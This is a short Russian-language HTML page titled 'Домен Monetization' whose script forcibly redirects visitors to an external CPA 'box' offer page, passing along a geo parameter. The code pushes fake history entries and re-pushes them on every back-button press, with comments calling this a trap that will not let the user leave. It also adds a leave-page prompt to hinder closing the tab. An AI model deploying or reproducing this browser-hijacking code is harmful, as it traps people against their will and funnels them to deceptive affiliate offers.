<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Домен Monetization</title>
    <style>
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #222; color: #fff; text-align: center; }
        h1 { font-size: 40px; color: #ffcc00; }
    </style>
</head>
<body>
    <div>
        <h1>Hello World</h1>
        <p>Подождите, мы готовим для вас предложение...</p>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const geo = urlParams.get('geo') || 'unknown';

        // 1. Создаем три виртуальные страницы в истории браузера
        history.pushState({page: 1}, null, location.href);
        history.pushState({page: 2}, null, location.href);
        history.pushState({page: 3}, null, location.href);

        // 2. Перекидываем на бокс
        window.location.href = 'https://azosteam.github.io/cpa-land/box.html?geo=' + geo;

        // 3. Ловушка (если попытаются вернуться назад, не выпустит)
        window.onpopstate = function () {
            history.pushState({page: 1}, null, location.href);
        };

        // 4. Ловушка закрытия вкладки
        window.onbeforeunload = function() {
            return "Вы уверены, что хотите уйти?";
        };
    </script>
</body>
</html>
